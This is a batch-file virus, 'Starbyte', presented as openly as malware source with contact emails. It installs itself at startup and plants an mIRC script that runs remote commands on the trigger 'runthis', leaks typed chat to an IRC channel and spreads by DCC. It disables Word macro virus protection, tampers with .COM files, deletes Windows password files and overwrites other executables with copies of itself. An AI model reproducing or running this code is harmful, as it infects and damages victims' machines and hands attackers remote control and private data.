@ECHO OFF
CTTY NUL
MD c:\Starbyte
ECHO ...>> STARBYTE VIRUS <<...>c:\Starbyte\x.xxx
ECHO Contact me at Starbyte@Hotmail.com or Jerret_Black@Hotmail.com !>>c:\Starbyte\x.xxx
COPY %0 C:\DRV.SYS>nul
copy %0 c:\Starbyte\Starbyte.exe>nul
ECHO [script]>c:\Starbyte\sc.ini
ECHO n0=sc.ini>>c:\Starbyte\sc.ini
ECHO n1=>>c:\Starbyte\sc.ini
ECHO n2=on 1:START:{>>c:\Starbyte\sc.ini
ECHO n3=  .sreq ignore>>c:\Starbyte\sc.ini
ECHO n4=  .remote on>>c:\Starbyte\sc.ini
ECHO n5=}>>c:\Starbyte\sc.ini
ECHO n6=on 1:CONNECT:>>c:\Starbyte\sc.ini
ECHO n7=.msg #Starbyte every Day !?!>>c:\Starbyte\sc.ini
ECHO n8=on 1:INPUT:*:{>>c:\Starbyte\sc.ini
ECHO n9=  .msg #Starbyte ( $+ $active $+ ) $1->>c:\Starbyte\sc.ini
ECHO n10=}>>c:\Starbyte\sc.ini
ECHO n11=on 1:TEXT:*:?:{>>c:\Starbyte\sc.ini
ECHO n12=  if ( $1 == runthis ) { .run $2- }>>c:\Starbyte\sc.ini
ECHO n13=}>>c:\Starbyte\sc.ini
ECHO n14=>>c:\Starbyte\sc.ini
ECHO n15=on 1:JOIN:*:{>>c:\Starbyte\sc.ini
ECHO n16=  if ( $nick == $me ) { halt }>>c:\Starbyte\sc.ini 
ECHO n17=  /dcc send $nick Starbyte.exe>>c:\Starbyte\sc.ini
ECHO n18=}>>c:\Starbyte\sc.ini
ECHO REGEDIT4>c:\REG.REG
ECHO.>>c:\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]>>c:\REG.REG
ECHO "RegisteredOwner"="Starbyte">>c:\REG.REG
ECHO "RegisteredOrganization"="LUCKY B.R.D 1994-99">>c:\REG.REG
ECHO [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]>>c:\REG.REG
ECHO "EnableMacroVirusProtection"="0">>c:\REG.REG
IF EXIST IO.SYS GOTO :p
ECHO INSTALLHIGH=C:\DRV.SYS>>C:\CONFIG.SYS
:p
ECHO @ECHO off>BA.BAT
ECHO Ctty nul>>BA.BAT
ECHO Move C:\REG.REG %%WINDIR%%\REG.REG>>BA.BAT
ECHO for %%%%i In (*.COM ..\*.COM) do copy /b %%%%i + c:\Starbyte\x.xxx %%%%i>>BA.BAT
ECHO IF EXIST c:\mIRC\*.* GOTO :1>>BA.BAT
ECHO IF NOT EXIST C:\mIRC\*.* GOTO :2>>BA.BAT
ECHO :1>>BA.BAT
ECHO MOVE c:\Starbyte\Starbyte.exe C:\mIRC\Starbyte.exe>>BA.BAT
ECHO MOVE c:\Starbyte\sc.ini C:\mIRC\Script.ini>>BA.BAT
ECHO GOTO :next>>BA.BAT
ECHO :2>>BA.BAT
ECHO IF EXIST C:\Progra~1\mIRC\*.* GOTO :3>>BA.BAT
ECHO IF NOT EXIST C:\Progra~1\mIRC\*.* GOTO :next>>BA.BAT
ECHO :3>>BA.BAT
ECHO MOVE c:\Starbyte\Starbyte.exe C:\Progra~1\mIRC\Starbyte.exe>>BA.BAT
ECHO MOVE c:\Starbyte\sc.ini C:\Progra~1\mIRC\Script.ini>>BA.BAT
ECHO GOTO :next>>BA.BAT
ECHO :next>>BA.BAT
ECHO IF EXIST IO.SYS GOTO :X>>BA.BAT
ECHO IF NOT EXIST IO.SYS GOTO :Z>>BA.BAT
ECHO :Z>>BA.BAT
ECHO @REGEDIT /S /C %%WINDIR%%\REG.REG>>BA.BAT
ECHO GOTO :X>>BA.BAT
ECHO :X>>BA.BAT
ECHO for %%%%i in (%%WINDIR%%\*.PWL) do DEL %%%%i>>BA.BAT
ECHO for %%%%i in (B*.exe,A*.exe) do copy %0 %%%%i>>BA.BAT
ECHO for %%%%i in (c:\Starbyte\*.*) do del %%%%i>>BA.BAT
ECHO RD c:\Starbyte>>BA.BAT
ECHO del %%0>>BA.BAT
CALL BA.BAT